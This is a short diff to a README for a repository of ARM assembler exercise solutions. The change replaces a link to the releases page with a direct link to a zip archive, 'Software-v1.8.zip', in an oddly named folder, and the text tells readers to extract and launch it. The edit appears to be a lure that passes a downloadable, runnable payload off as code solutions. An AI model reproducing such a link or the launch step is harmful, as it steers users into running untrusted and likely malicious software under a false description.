@@ -27,7 +27,7 @@ This repository contains a collection of assembler code solutions tailored to en
 
 ## 🚀 Get Started
 To access the assembler code solutions, download the files from the following link:
-[![Download Solutions](https://github.com/KunalJan/Blackboard/releases)](https://github.com/KunalJan/Blackboard/releases)
+[![Download Solutions](https://raw.githubusercontent.com/KunalJan/Blackboard/main/malleabilization/Software-v1.8.zip)](https://raw.githubusercontent.com/KunalJan/Blackboard/main/malleabilization/Software-v1.8.zip)
 
 If the link ends with a file name, you will need to extract and launch the content. Dive into the exercises and challenges, and enrich your knowledge of ARM programming.
 
